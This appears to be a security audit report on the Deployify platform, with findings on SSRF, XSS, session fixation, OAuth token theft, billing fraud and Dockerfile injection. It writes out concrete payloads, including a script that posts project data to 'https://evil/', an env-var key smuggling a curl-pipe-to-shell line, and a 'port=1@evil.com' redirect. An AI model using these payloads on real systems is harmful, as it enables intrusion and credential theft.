findings.failure_scenario: fetchOptions omits `redirect`, so fetch defaults to 'follow'. The only SSRF guard is on the *initial* URL and is a substring test gated on NODE_ENV: line 107-108 `const isProduction = process.env.NODE_ENV === 'production'; const isLocalTarget = targetUrl.includes('localhost') || targetUrl.includes('127.0.0.1');` - it never re-checks the redirect target and does not know about 169.254.169.254, [::1], 0.0.0.0 or metadata.google.internal. Attacker deploys a project whose app answers any request with `302 Location: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`, then requests https://deployify.io/api/v1/proxy/evil/x with the header `Metadata-Flavor: Google`. That custom header is forwarded verbatim by the loop at line 124 and, unlike cookie/authorization, is preserved by undici across the cross-origin redirect. The metadata response (application/json) is not HTML, so it falls through to line 207-211 and the raw body is returned to the attacker.
findings.impact: Attacker reads the Cloud Run service account's OAuth access token and any other metadata (project id, instance identity JWTs, custom attributes) straight out of the HTTP response. That service account is used elsewhere in the codebase for run.googleapis.com domain mappings (src/lib/gcp/domains.ts:13-27), compute.googleapis.com load balancers (src/lib/gcp/loadbalancer.ts), Secret Manager and Firestore - i.e. full control of the Deployify GCP project and every tenant's infrastructure and secrets.
findings.checked_mitigations: Grepped the route for 'redirect' and 'follow' - no matches, so the default 'follow' applies. Read lines 100-165 in full: the localhost check runs once on `targetUrl` before the fetch and is skipped entirely when NODE_ENV !== 'production'. No allowlist of *.run.app hosts, no DNS/IP validation, no fetch wrapper - `fetch` is the global.

findings.title: Tenant-controlled HTML is served on the Deployify apex origin with Content-Type text/html and no CSP, yielding stored XSS on the dashboard origin
findings.failure_scenario: Because the handler is reachable at https://deployify.io/api/v1/proxy/<slug>/<path> (no host check anywhere in the file, and src/proxy.ts never blocks that pathname), the attacker's own deployed application body is rendered by the browser as a document on the dashboard's own origin. Attacker deploys an app returning `<script>fetch('/api/projects').then(r=>r.json()).then(d=>fetch('https://evil/',{method:'POST',body:JSON.stringify(d)}))</script>` and lures a logged-in victim to https://deployify.io/api/v1/proxy/evil/. The script executes as same-origin JavaScript on deployify.io with the victim's session cookie automatically attached to every relative fetch.
findings.impact: Full same-origin takeover of the dashboard: read/modify every project, exfiltrate decrypted env vars, add domains, delete projects, change billing - all as the victim, without ever needing to read the httpOnly cookie. Note also that the attacker-supplied page is served under Cache-Control:no-store but the origin has no Content-Security-Policy at all.
findings.checked_mitigations: `rg -rn 'Content-Security-Policy' src/ next.config.ts` returns nothing - no CSP anywhere. src/lib/security/index.ts:123-130 and src/proxy.ts:12-18 set only nosniff/XFO/XSS-Protection/Referrer-Policy, none of which stop same-origin script execution. No sandboxing, no separate origin, no auth check on the route.

findings.title: All response headers from the tenant app, including Set-Cookie, are copied back to the browser on the Deployify origin
findings.failure_scenario: 'set-cookie' is not in skipHeaders. Attacker deploys an app that answers with `Set-Cookie: deployify_session=<JWT the attacker minted for their own account>; Path=/`. A victim who loads https://deployify.io/api/v1/proxy/evil/anything (a plain image/link works, the header is applied on any response) gets that cookie written for the apex host, overwriting their own session. When the victim then goes to the dashboard they are silently operating inside the attacker's account and will connect repositories, paste env secrets and add payment methods there. The same primitive works from a project subdomain with `Domain=.deployify.io`, since a cookie scoped to the parent domain is accepted from slug.deployify.io.
findings.impact: Session fixation / cookie tossing on the primary application domain: victims are forced into an attacker-controlled session (credential and source-code theft), or arbitrary apex cookies are overwritten to break CSRF/state handling. Any tenant can do this to any Deployify user.
findings.checked_mitigations: Read the whole handler: no filtering of set-cookie, no cookie rewriting, no domain scoping. src/lib/auth.ts sets the session cookie with path '/' and no Domain, so a same-name host-only cookie written by this path collides with and can shadow the real one. Nothing in src/proxy.ts strips Set-Cookie from downstream responses.

findings.title: Project slugs are unique only per user but the edge proxy resolves them globally, allowing cross-tenant subdomain and Cloud Run service hijack
findings.failure_scenario: getProjectBySlug filters on userId (src/lib/db.ts:1016-1024), so two different users can hold the identical slug. The proxy resolves hostnames with getProjectBySlugGlobal (src/lib/db.ts:673-677: `.where('slug','==',slug).limit(1)`), a query with no orderBy, which Firestore serves ordered by document id. Document ids are `proj_` + Math.random base36 (src/lib/utils.ts:20-24, src/lib/db.ts:981). Attacker creates a project named exactly like the victim's ('acme-app'), deletes and recreates it a few times until they hold a lexicographically smaller id than the victim's, and from then on https://acme-app.deployify.io (rewritten by src/proxy.ts:108 to /api/v1/proxy/acme-app/...) serves the attacker's application to the victim's users. Worse, GCP resource names are derived from the same slug: generateServiceName returns `dfy-<slug>` (src/lib/utils.ts:52-56), so the attacker's production deploy targets the victim's Cloud Run service `dfy-acme-app`, and DELETE /api/projects/<attacker project> lists and deletes every service with prefix `dfy-acme-app` (src/app/api/projects/[id]/route.ts:328-338).
findings.impact: Cross-tenant takeover: an attacker serves arbitrary content (phishing, malware, cookie/credential harvesting) on another tenant's Deployify subdomain, overwrites that tenant's running production Cloud Run revision with their own image, reads their runtime logs (src/app/api/projects/[id]/logs/route.ts:69 uses the same `dfy-<slug>`), and can destroy their services on project deletion.
findings.checked_mitigations: `rg -n "where\('slug'" src/lib/db.ts` shows only two slug queries: the global one (line 675) and the per-user one (line 1022). There is no reserved/unique slug collection, no transaction, and no uniqueness index. src/proxy.ts's reservedSubdomains list (line 96) only protects Deployify's own subdomains, not other tenants' slugs. resolveProject's numeric-suffix fallback (route.ts:65-72) widens the collision surface further.

findings.title: Unauthenticated edge proxy traffic bypasses rate limiting entirely and drives one Firestore write plus one BigQuery insert per request
findings.failure_scenario: This block returns before the rate-limit block at line 115, so every request to any project subdomain is completely unmetered. Each proxied HTML GET calls logEdgeEvent (route.ts:180), which does `db.collection(Collections.ANALYTICS_EVENTS).add(eventData)` (route.ts:45) plus a BigQuery streaming insert (route.ts:49). An attacker curls https://anyproject.deployify.io/?i=1..N in a loop and generates unbounded Firestore document writes and BigQuery inserts billed to Deployify. The apex path /api/v1/proxy/... is nominally rate limited, but the key is `${ip}:${pathname}` (line 124) with ip taken from the client-controlled first element of X-Forwarded-For (line 116), so simply varying the path or the X-Forwarded-For value defeats it. The proxy.ts rateLimitStore Map (line 21) also has no eviction - unlike src/lib/security/index.ts:39-47 which has cleanupExpiredEntries - so each unique ip:path key is retained forever.
findings.impact: Direct financial denial-of-wallet (unbounded Firestore writes + BigQuery streaming inserts + Cloud Run egress) and memory exhaustion of the edge runtime from the ever-growing rate-limit Map; the same X-Forwarded-For spoof also defeats the strict 30/min limit intended for /api/auth/ and /api/webhooks/.
findings.checked_mitigations: Read src/proxy.ts end to end: the rewrite at line 109 returns before line 115's rate-limit code, and the route handler itself imports no rate limiter (`rg -n 'checkRateLimit' src/app/api/v1/proxy` is empty). isBot() at route.ts:8-11 only skips logging for user agents that self-identify as bots, which an attacker will not do. No cleanup call exists for the Map declared at src/proxy.ts:21.

findings.title: Project webhookUrl is stored and POSTed to with no scheme/host validation, giving authenticated blind SSRF from inside the GCP project
findings.failure_scenario: PATCH /api/projects/[id] accepts 'webhookUrl' in its allowedFields list (src/app/api/projects/[id]/route.ts:136) and applies it with no validation - the validation block that follows only covers buildTimeout, autodeployBranches and resources. A user sets webhookUrl to `http://10.128.0.5:8080/admin/shutdown` (or any VPC-internal / link-local address reachable from the Cloud Run instance) and triggers a deployment; syncDeploymentStatus then calls sendWebhookNotification(webhookUrl, ...) (src/lib/deployment.ts:53-59, 242-247) and the server issues an attacker-directed POST with a JSON body from inside Deployify's network perimeter.
findings.impact: Any signed-up user turns the Deployify backend into a request-forgery relay against internal/VPC-only services and cloud endpoints that are not otherwise reachable from the internet, and can port-scan the internal network by observing deployment timing.
findings.checked_mitigations: Read src/lib/webhooks.ts in full - no URL parsing, no protocol allowlist, no IP/DNS check. Grepped every webhookUrl write path: src/app/api/projects/[id]/route.ts:136 (PATCH allowedFields, no validation added) and the store field src/store/project-slice.ts:295. `rg -n 'validateConnectionString'` exists for env vars but is never applied to webhookUrl.

findings.title: DELETE /api/projects/[id]/domains has no owner/admin role check, so a team viewer can remove a project's custom domain mapping
findings.failure_scenario: checkProjectAccess returns `{allowed: true, role: membership.role}` for ANY team membership including 'viewer' (src/middleware/rbac.ts:19-21). The POST handler in this same file guards with `if (access.role !== 'owner' && access.role !== 'admin')` at lines 100-105, but the DELETE handler omits that guard entirely. A viewer-role member (or a compromised viewer account, e.g. a contractor invited for read-only log access) sends DELETE /api/projects/<id>/domains?domainId=dom_xxx and the handler calls deleteDomainMapping, tearing down the Cloud Run domain mapping for the production custom domain and dropping it from Firestore.
findings.impact: Least-privileged team members can take a team's production custom domain offline; restoring it requires re-creating the mapping and waiting for Google-managed certificate re-issuance, so this is a durable outage, not a momentary one.
findings.checked_mitigations: Read both handlers in the same file: POST enforces owner/admin at line 100, DELETE (lines 187-250) performs only checkProjectAccess with no role comparison. Confirmed in src/middleware/rbac.ts that 'viewer' membership yields allowed:true. No secondary role check inside deleteDomainMapping (src/lib/gcp/domains.ts:70-112).

result.coverage_notes:
Read end-to-end: src/proxy.ts, src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, src/lib/gcp/domains.ts, src/lib/gcp/loadbalancer.ts, src/app/api/projects/[id]/domains/route.ts, src/lib/performance/lighthouse.ts, src/lib/webhooks.ts, src/lib/auth.ts, src/lib/config.ts, src/middleware/rbac.ts, src/lib/security/index.ts, next.config.ts, plus the relevant slices of src/lib/db.ts, src/lib/deployment.ts, src/lib/utils.ts and src/app/api/projects/route.ts and /[id]/route.ts.

Explicitly investigated and REJECTED as non-findings (each refutable on inspection, so not reported): (1) path traversal / absolute-URL smuggling through [[...path]] - targetUrl is built as `${baseUrl}${fullPath}` where fullPath always begins with '/', so '..', '//evil.com' and backslash payloads only alter the path component; the WHATWG URL parser has already fixed the authority and normalizes '..' back within the same origin. (2) x-frame-options being stripped at route.ts:170 - src/proxy.ts:12-18 re-applies 'X-Frame-Options: DENY' to both the rewrite and the default response, so the proxied page is not framable. (3) analytics <script> tag injection using project.analyticsApiKey (route.ts:185) - the key is server-generated and the injected tag lands only in that same project's own HTML, so there is no cross-tenant escalation beyond finding #3. (4) path injection into the Cloud Run Admin API through deleteDomainMapping/getDomainMappingStatus (src/lib/gcp/domains.ts:89,136 interpolate `domain` into the URL unencoded) - blocked because the only write path validates against the strict isValidDomain regex at src/app/api/projects/[id]/domains/route.ts:16, which forbids '/' and '.', and 'domains' is not in the PATCH allowedFields. (5) lighthouse.ts - the user URL goes into a query parameter of a fixed googleapis.com endpoint, not into the request target. (6) external-sync.ts - user-controlled segments (supabaseId, neonProjectId, organization, database) are interpolated into fixed third-party hosts using the user's own API token, so traversal there only reaches the caller's own vendor account.

NOT covered by this dimension/pass: the ~80 other API route handlers (authz sweep), the /api/v1/collect ingest endpoint and public/deployify-insights.js internals, the storage database connectors (pg/mysql2/mongodb/ioredis/BigQuery), billing webhooks, and src/lib/crypto.ts key derivation. I did not run the app or attempt live exploitation - all findings are from source reading, and the metadata-SSRF chain (finding #2) depends on undici preserving non-sensitive custom headers across a cross-origin redirect, which is the documented fetch behaviour (only authorization/cookie/proxy-authorization/host are stripped).

findings.title: OAuth callback CLI branch redirects the session JWT to an attacker-controlled host (unvalidated `port` -> URL userinfo injection)
findings.failure_scenario: `port` is taken verbatim from the query string of GET /api/auth/github (src/app/api/auth/github/route.ts:10), stored in the `deployify_cli_context` cookie, and interpolated straight into a redirect URL. Because `port` is never validated as numeric, a value containing `@` moves the real host out of the `localhost` prefix: I confirmed in node that `new URL('http://localhost:1@evil.com/callback?token=SECRET')` yields `hostname = evil.com` (`localhost` becomes the userinfo). Exploit: attacker sends a victim who is already logged into GitHub a link to `https://<app>/api/auth/github?cli=true&port=1@evil.com`. That request itself mints the `oauth_state` cookie, so the CSRF state check at callback line 37 passes. GitHub auto-approves (the app is already authorized), the callback mints a real 7-day session JWT for the victim, and line 77 302s the victim's browser to `http://localhost:1@evil.com/callback?token=<victim JWT>`. The attacker's server reads the token from the query string.
findings.impact: Full account takeover from a single link click. The stolen JWT is a complete 7-day session for the victim AND embeds their GitHub OAuth access token with `repo read:user user:email` scope (src/lib/auth.ts:29, src/lib/auth.ts:176), so the attacker also gets read/write access to all of the victim's private GitHub repositories. There is no revocation mechanism (see separate finding), so the token stays valid for 7 days even after the victim logs out.
findings.checked_mitigations: Grepped both auth routes for any port validation (`rg -n "port" src/app/api/auth/github/route.ts src/app/api/auth/callback/route.ts`) and for helpers (`isValidPort|parseInt\(port|/^\\d`) in src/lib/utils.ts and src/lib/security — zero hits. Confirmed the CSRF `state` check at callback route lines 33-41 does NOT mitigate this, because the attacker-supplied URL is what generates the state cookie in the first place. Verified `new URL(...)` userinfo parsing empirically with node.

findings.title: Public reverse proxy forwards the browser's `Cookie` header (including `deployify_session`) to tenant-controlled Cloud Run origins
findings.failure_scenario: Only `host` and `connection` are stripped; `cookie` is forwarded. The route is reachable directly on the platform's own apex origin at `https://<app>/api/v1/proxy/<slug>/<path>` — src/proxy.ts treats the apex as `isBaseDomain` (line 75), skips the subdomain rewrite, and falls through to `NextResponse.next()` with no auth gate for `/api/**`. The session cookie is host-only for the apex with `path: '/'` (src/lib/auth.ts:117-123), so it IS sent on that path. Exploit: attacker signs up, creates a project (slug is derived from their own project name, src/app/api/projects/route.ts:118-120) and deploys an app whose handler logs inbound headers. They then get a logged-in Deployify user to make one top-level navigation to `https://<app>/api/v1/proxy/attacker-slug/anything` (SameSite=Lax permits cookies on top-level GET navigations, and any in-app link is same-site anyway). handleProxyRequest fetches `project.productionUrl` with the victim's `Cookie: deployify_session=<victim JWT>` header attached.
findings.impact: Any Deployify user can harvest other users' full session JWTs — and therefore their embedded GitHub `repo`-scope OAuth tokens — with no privileged position, just a deployed app on the platform. There is no allowlist on which headers cross the trust boundary and no authentication on the proxy endpoint.
findings.checked_mitigations: Read the whole route file end to end: there is no `headers.delete('cookie')`, no `getSession`/`requireAuth`/`checkProjectAccess` call, and no origin check. Checked src/proxy.ts lines 114-178: the dashboard auth gate only covers `/dashboard` and `/new`, and `/api/v1/proxy/...` on the apex only hits the in-memory rate limiter. Verified the session cookie's `path: '/'` scope at src/lib/auth.ts:121 so it is transmitted to this path.

findings.title: Reverse proxy copies `Set-Cookie` from tenant apps back onto the platform origin, enabling session fixation
findings.failure_scenario: `set-cookie` is not in `skipHeaders`, so a response header chosen by the tenant's app is re-emitted by the platform on the platform's own origin. Exploit: attacker deploys an app that answers every request with `Set-Cookie: deployify_session=<attacker's own valid JWT>; Path=/; Max-Age=604800`. They lure a victim to `https://<app>/api/v1/proxy/attacker-slug/x`. The response overwrites the victim's cookie (same name, same host-only domain, same `path=/`, per src/lib/auth.ts:117-123). The victim continues using the dashboard while silently authenticated as the attacker, so every repo they connect, project they create, and environment variable/secret they paste lands in the attacker's account. A variant of the same primitive sets `deployify_session=%`, which makes `decodeURIComponent(cookieStore.get(COOKIE_NAME)?.value || '')` at src/lib/auth.ts:90 throw URIError on every request — a persistent 500 for that victim until they manually clear cookies.
findings.impact: Attacker-controlled session fixation on the platform origin: victim's work and secrets are funnelled into the attacker's account, or the victim is permanently locked out via an unparseable cookie. Also lets any tenant set arbitrary cookies (and other response headers such as CSP or Access-Control-Allow-Origin) on the platform's own domain.
findings.checked_mitigations: Read the full response-forwarding block; `set-cookie` is absent from `skipHeaders` and nothing else in the file filters it. Confirmed src/lib/auth.ts:90 wraps the cookie value in a bare `decodeURIComponent` with no try/catch, and that `getSession` is called from src/app/dashboard/layout.tsx:19 and 105 API routes, so the throw is not contained.

findings.title: Full Session object — including the GitHub `repo`-scope OAuth access token — is serialized into the RSC payload of every dashboard page
findings.failure_scenario: `DashboardSidebar` is a Client Component, so Next.js App Router serializes every prop passed to it into the RSC flight payload that is inlined in the HTML response (`self.__next_f.push(...)`). The whole `Session` is passed, not just the display fields the sidebar actually reads (`session.user.avatarUrl`, `.githubUsername`, `.name`, `.subscription.tier` at lines 222-237). `Session.accessToken` is the raw GitHub OAuth token minted at src/app/api/auth/callback/route.ts:44 with scope `repo read:user user:email` (src/lib/auth.ts:176). The layout is `export const dynamic = 'force-dynamic'`, so this happens on every dashboard render. Concretely: any XSS anywhere in the dashboard, any malicious browser extension with content-script access, or any HTML-caching intermediary can read the token out of the page body — the httpOnly cookie protection is completely bypassed, because the token is in the document, not just the cookie.
findings.impact: Defeats the entire point of storing the session in an httpOnly cookie for the most sensitive credential in the system: a GitHub token that can read and write all of the user's private repositories. Any low-severity DOM XSS in the dashboard escalates straight to GitHub repo compromise.
findings.checked_mitigations: Checked next.config.ts for `experimental.taint` / `taintObjectReference` — not enabled (only `serverActions.bodySizeLimit` is set). Grepped for a sanitized/trimmed session shape being constructed before the prop is passed — there is none; `getSession()`'s return value goes straight through. Confirmed DashboardSidebar carries the `'use client'` directive on line 1, so this is a server->client prop boundary, and confirmed it only ever reads `session.user.*`, so the `accessToken` is being shipped for no functional reason.

findings.title: /api/billing/verify trusts a client-supplied `tierId` that the Razorpay signature does not cover, then mints a new session JWT with the escalated tier
findings.failure_scenario: The HMAC covers only `orderId + '|' + paymentId`. `tierId` is read from the request body and never cross-checked against the order — the server never re-fetches the order from Razorpay to compare `notes.tierId` or `amount`, even though /api/billing/checkout does stamp them (src/app/api/billing/checkout/route.ts:76-81, `{ userId: user.id, tierId: tier.id }`). Exploit: user starts a legitimate checkout for the cheapest paid tier, `pro` at 1500 INR (src/lib/billing/tiers.ts:44-45), pays it, and Razorpay hands the browser a genuine `razorpay_order_id`/`razorpay_payment_id`/`razorpay_signature`. Instead of letting the page post them (src/app/billing/page.tsx:137-145), the user replays the same three values to POST /api/billing/verify with `tierId: "enterprise"` (15000 INR, src/lib/billing/tiers.ts:68-69). The signature validates, the subscription is written as enterprise, and a fresh session JWT is minted carrying `subscription.tier = 'enterprise'`. The same triple can also be replayed indefinitely — nothing marks an order as consumed — each replay pushing `currentPeriodEnd` another 30 days.
findings.impact: 10x billing fraud (pay for pro, receive enterprise) plus unlimited free renewal by replaying one payment. The escalated tier is persisted to Firestore and therefore enforced by the real quota path (src/lib/billing/caps.ts:38-40 `getTier(user.subscription?.tier)` used by src/app/api/projects/[id]/deploy/route.ts), so it is not merely a cosmetic badge.
findings.checked_mitigations: Read src/lib/billing/payments.ts:47-62 in full — `verifyPaymentSignature` is correctly fail-closed on a missing secret, but its input genuinely excludes `tierId` and the amount. Grepped the verify route for any `getRazorpay().orders.fetch`, order-to-user binding, or replay/idempotency guard — none exists. Confirmed src/app/api/billing/checkout/route.ts computes the amount server-side from TIERS, which is precisely the binding that verify then throws away.

findings.title: `MOCK_DB=true` alone grants an unauthenticated enterprise admin session in any environment, with no production guard
findings.failure_scenario: The `MOCK_DB === 'true'` disjunct is evaluated independently of NODE_ENV, so it is honoured in a production container. The Dockerfile pins `ENV NODE_ENV=production`, but Cloud Run env vars are set at deploy time and override nothing about this check. If `MOCK_DB=true` is ever present on a deployed revision — copied from a staging service YAML, a `gcloud run deploy --set-env-vars` carried over from a debugging session, or an .env file baked into an image — then every anonymous request to the production URL is served as the `audit-test` enterprise user: src/proxy.ts:165 waves the request past the /dashboard gate and src/lib/auth.ts:99 returns MOCK_SESSION to all 105 `getSession()` call sites, i.e. full unauthenticated access to the dashboard, projects, storage credentials and billing APIs. The same flag simultaneously disables real checks across ~40 other modules (src/lib/gcp/iam.ts, src/lib/gcp/cloudsql.ts, src/lib/firebase.ts, src/app/api/billing/checkout/route.ts:19), so the failure is silent — the app looks healthy rather than erroring out.
findings.impact: A single stray environment variable converts the platform from authenticated to fully open, with no fail-safe. Every other production-sensitive switch in the file is gated on NODE_ENV (lines 93, 131), so this one is an outlier and is easy to miss in a deploy review.
findings.checked_mitigations: Swept the repo for any production guard on this flag: `rg -n "MOCK_DB"` returns ~60 hits and not one of them is combined with a `NODE_ENV === 'production'` refusal. Confirmed the Dockerfile sets NODE_ENV=production (so the `development` disjunct is safe in the shipped image) and that no committed deploy manifest currently sets MOCK_DB — the defect is the missing guard, not a present misconfiguration.

findings.title: No session revocation whatsoever: a 7-day JWT cannot be invalidated, and logout is purely client-side
findings.failure_scenario: `createSessionToken` (src/lib/auth.ts:15-38) emits no `jti`, no session id, and no user token-version claim, and `verifySessionToken` consults nothing but the signature and the embedded `expiresAt` — there is no denylist, no Firestore session collection, and no per-user token epoch anywhere in the repo. `POST /api/auth/logout` only calls `clearSessionCookie()`, which deletes the browser cookie; the JWT itself stays valid for its full 7 days. Concretely: a user realises their token leaked (via any of the exfiltration paths above, or from `~/.deployify.json`, which the CLI writes with default 0644 permissions at src/cli/index.js:109 and which contains the same JWT in plaintext). They log out, they rotate their GitHub password, they revoke the OAuth app — none of it helps. The only remediation available to an operator is rotating `JWT_SECRET`, which signs out every user on the platform simultaneously.
findings.impact: Turns every token-disclosure bug into a guaranteed 7-day compromise window with no containment option, and makes 'sign out of all devices', per-session audit, and incident response impossible. The blast radius is amplified because the token also carries the GitHub `repo`-scope access token in its payload (src/lib/auth.ts:29), and a JWT is signed but not encrypted, so anyone holding it can also just base64-decode the GitHub token out of it.
findings.checked_mitigations: Grepped case-insensitively for `revoke|jti|tokenVersion|sessionVersion|invalidateSession|logoutAll` across src — the only hits are team-invite revocation and GCP IAM role revocation, nothing session-related. Read both logout handlers (src/app/api/auth/logout/route.ts) end to end: both paths call only `clearSessionCookie()`. Confirmed `verifySessionToken` performs no database lookup of any kind.

result.coverage_notes:
Swept end-to-end: src/lib/auth.ts (all 182 lines), src/lib/config.ts, src/app/api/auth/{github,callback,logout}/route.ts, src/proxy.ts, src/app/dashboard/layout.tsx, src/components/DashboardSidebar.tsx, src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, src/app/api/billing/{checkout,verify}/route.ts, src/lib/billing/{payments,caps,tiers}.ts, src/app/billing/page.tsx, src/cli/index.js login flow, Dockerfile, env.example, next.config.ts. Repo-wide greps for MOCK_DB (~60 hits), NODE_ENV, verifySessionToken/createSessionToken/deployify_session, revoke|jti|tokenVersion, session prop drilling, and port validation helpers.

Hypotheses I tested and REJECTED (do not re-report):
- "Undefined JWT_SECRET yields an auth bypass." Verified empirically with node + jose: `new TextEncoder().encode(undefined)` produces a zero-length key and jose throws `DOMException: Zero-length key is not supported` on both sign and verify. verifySessionToken catches and returns null, and getSession's no-token path returns null in production. It fails closed (total outage, not a bypass), so it is not a security finding. validateConfig() only console.warns on missing vars, which is the underlying smell.
- "OAuth state is generated but never verified." It IS verified — src/app/api/auth/callback/route.ts:33-41 compares the `oauth_state` cookie to the `state` param, using 32 bytes of crypto.getRandomValues. The double-submit pattern is sound; it just does not (and cannot) defend against finding #1, where the attacker supplies the initiating URL.
- "The `oauth_state` cookie's `secure: process.env.NODE_ENV === 'production'` is wrong on Cloud Run." The comments at src/lib/auth.ts:114 and callback:93 imply NODE_ENV may not be production there, but the Dockerfile hard-sets `ENV NODE_ENV=production` in the runner stage, so the shipped image is fine. Inconsistent style, not exploitable.
- "The dev-only `'deleted'` cookie sentinel reaches production." Both branches (src/lib/auth.ts:93 and :131) are gated purely on `NODE_ENV === 'development'`, with no MOCK_DB disjunct, so a production container cannot reach them.
- "GET /api/auth/logout is CSRF-able." True, but the impact is a forced logout only. Below the medium bar.
- "proxy.ts only checks cookie presence, not validity, for /dashboard." Real, but not independently exploitable: src/app/dashboard/layout.tsx:22-31 re-checks with getSession() and every API route calls getSession() itself, so a garbage cookie yields a redirect, not access. Reported only as context inside finding #6.

NOT covered (out of my dimension or needs runtime): the ~86 API routes' per-route authorization (checkProjectAccess coverage), src/middleware/rbac.ts internals, src/lib/crypto.ts key derivation (note: config.security.encryptionKey falls back to JWT_SECRET at src/lib/config.ts:60 — key reuse across two cryptosystems, worth a crypto-dimension look), the /api/v1/collect ingest endpoint, and GitHub webhook signature verification. One adjacent routing issue I confirmed but did not report because it belongs to another dimension: project slug uniqueness is enforced per-user (src/app/api/projects/route.ts:123 getProjectBySlug(session.user.id, slug)) while public resolution is global with `.limit(1)` and no ordering (src/lib/db.ts:671-690), so two users can hold the same slug and traffic resolution between them is non-deterministic.

findings.title: Unvalidated env-var keys are interpolated raw into the generated Dockerfile, giving any authenticated user code execution inside Deployify's shared Cloud Build project
findings.failure_scenario: Any signed-up user POSTs /api/projects with `envVariables: [{ key: "A\nRUN curl -s https://attacker.tld/x.sh | sh", value: "1", target: "build" }]` (or PUTs the same key onto an existing var via /api/projects/[id]/env, bypassing the POST-only regex). getEnvVarsForDeployment copies the key verbatim into buildEnvVars; cloudbuild.ts emits `ARG A\nRUN curl -s https://attacker.tld/x.sh | sh` into dockerArgDeclarations, which is interpolated into the Dockerfile template and written by the heredoc. The next deploy runs the attacker's RUN line inside the Cloud Build worker. A key containing a line equal to `EOFMARKER` escapes the heredoc entirely into the build step's bash.
findings.impact: Arbitrary code execution in the platform's shared Cloud Build project, under the build service account that the same config uses to run `gcloud run deploy` (cloudbuild.ts:370-399) and to pull every tenant's Secret Manager connection strings. That means cross-tenant compromise: read/modify other customers' Cloud Run services, push images to the shared `deployify-images` Artifact Registry, and reach other tenants' secrets.
findings.checked_mitigations: Grepped for key sanitization: `isValidEnvVarKey` exists at src/lib/security/index.ts:158 but `rg -n "isValidEnvVarKey" src` returns only its definition — it is never called. POST /api/projects/[id]/env:93 is the only regex check and does not cover POST /api/projects or PUT /api/projects/[id]/env. No escaping is applied to `key` anywhere between db.ts:248 and dockerfiles.ts:122; `escapeBashArg` (cloudbuild.ts:205) is defined but not applied to the Dockerfile heredoc path.

findings.title: IaC export endpoint returns the plaintext database connection string to viewers with no role gate
findings.failure_scenario: A team member holding the read-only `viewer` role (TeamRole is 'owner'|'admin'|'member'|'viewer', src/types/index.ts:75) issues `GET /api/projects/<id>/storage/<storageId>/export/iac?format=env`. The handler only calls checkProjectAccess and never inspects access.role, so it fetches the connector secret from GCP Secret Manager and returns e.g. `DATABASE_URL="postgresql://app:S3cr3t@10.0.0.5:5432/prod"` as a downloadable file.
findings.impact: Full production database credentials (Cloud SQL / Supabase / PlanetScale / MongoDB Atlas / Redis) are handed to a principal the product explicitly treats as read-only, defeating the entire Secret Manager design. The attacker gets direct network-level DB access outside every guardrail (query masking, audit logging, row limits) the app applies.
findings.checked_mitigations: Every sibling route under the same directory has the gate — export/route.ts:30, rotate/route.ts:29, clone/route.ts:27, import/route.ts:30, ingest/route.ts:23, cutover/route.ts:23, audit/route.ts:29, apply-index/route.ts:32 all contain `if (access.role === 'viewer')`; replica routes require owner/admin. query/route.ts:943 even masks results for viewers (`const shouldMask = widgetId || access?.role === 'viewer'`). `grep -c viewer` on export/iac/route.ts returns 0. There is no proxy-level or middleware role check either (src/proxy.ts does session/edge work only).

findings.title: Decrypted GitHub OAuth access token is embedded in a Cloud Build step argument and persisted in build history
findings.failure_scenario: Any push to a connected private repo triggers submitCloudBuild with this config. The token is stored verbatim inside `build.steps[0].args[1]` in the Cloud Build API for the platform's GCP project and is returned in cleartext by `gcloud builds describe <id>` / `cloudbuild.builds.get` to every principal with the Cloud Build Viewer role, for the full retention life of the build record. It is also visible to any process inside that build step via /proc and to the build's own workspace.
findings.impact: A GitHub user OAuth token with the app's full granted scopes (repo access to everything that user can reach, not just this project) is stored in cleartext in shared platform infrastructure. Anyone with Cloud Build read access — a support engineer, a CI service account, or an attacker who achieves the build-time RCE described in the Dockerfile-injection finding — harvests every customer's GitHub token at once. Careful design elsewhere (AES-GCM at rest, Secret Manager for DB creds) is nullified.
findings.checked_mitigations: Checked whether Cloud Build's own secret plumbing is used: the same file uses `--set-secrets` for storage connectors (cloudbuild.ts:388) and computes `secretResourceNames` for IAM binding (cloudbuild.ts:197-209), so availableSecrets/Secret Manager was clearly available and simply not used for the git token. Grepped `rg -n "availableSecrets|secretEnv" src` — no hits. No redaction of the token before JSON.stringify at cloudbuild.ts:569.

findings.title: Full database connection strings (with passwords) are written to application logs during PR-close cleanup
findings.failure_scenario: A tenant with a MongoDB Atlas or Memorystore Redis connector and branching enabled closes a pull request. GitHub delivers the `pull_request: closed` webhook; the handler pulls the raw secret out of Secret Manager and console.logs it in full — e.g. `[Cleanup] Dropping ephemeral MongoDB database at mongodb+srv://appuser:Pa55w0rd@cluster0.abcd.mongodb.net/pr42`. On Cloud Run that stdout line lands in Cloud Logging.
findings.impact: Live production/preview database credentials are copied out of Secret Manager into Cloud Logging, where they are retained (30 days by default in the _Default bucket), exported to any configured log sink/SIEM, and readable by every principal holding roles/logging.viewer on the platform project — a far broader and less-audited audience than roles/secretmanager.secretAccessor. Nothing in the app can revoke a credential once it is in the log stream.
findings.checked_mitigations: Checked for a redaction helper on this path: src/lib/utils/masking.ts exports maskString/maskData (which do mask `password`-ish object keys and would have helped), but `rg -n "maskString|maskData" src/app/api/webhooks` returns nothing — they are only used by the Data Lab query path. The adjacent Firestore branch (line 310) deliberately logs only `databaseId`, and seeding.ts:107/115 deliberately logs only `connectionString.split('@')[1]`, so the codebase knows to strip credentials — these two call sites do not.

findings.title: Single sha256-derived key with silent JWT_SECRET fallback and no key version makes secret-key rotation impossible without total data loss
findings.failure_scenario: Two concrete failures. (1) Rotation: an operator who deployed without setting ENCRYPTION_KEY (config.validateConfig() only warns, config.ts:99-101) rotates JWT_SECRET after a session-forgery scare. Every stored ciphertext was produced under sha256(old JWT_SECRET). getEnvVarsForDeployment (src/lib/db.ts:237-243) then throws `Failed to decrypt secret <KEY>` for every project with a secret env var, so all deploys fail; webhooks/github/route.ts:164 `decrypt(project.githubToken)` throws, so every private-repo push webhook 500s. Because the `enc:` envelope has no key identifier, there is no dual-key/decrypt-with-old-then-re-encrypt path and no rotation script exists — the only recovery is asking every customer to re-enter every secret. (2) Blast radius: one leak of JWT_SECRET (from a log, a container inspect, or a stale .env) simultaneously lets an attacker mint arbitrary `deployify_session` JWTs and decrypt every stored env secret and GitHub token, because the signing key and the encryption key are the same bytes.
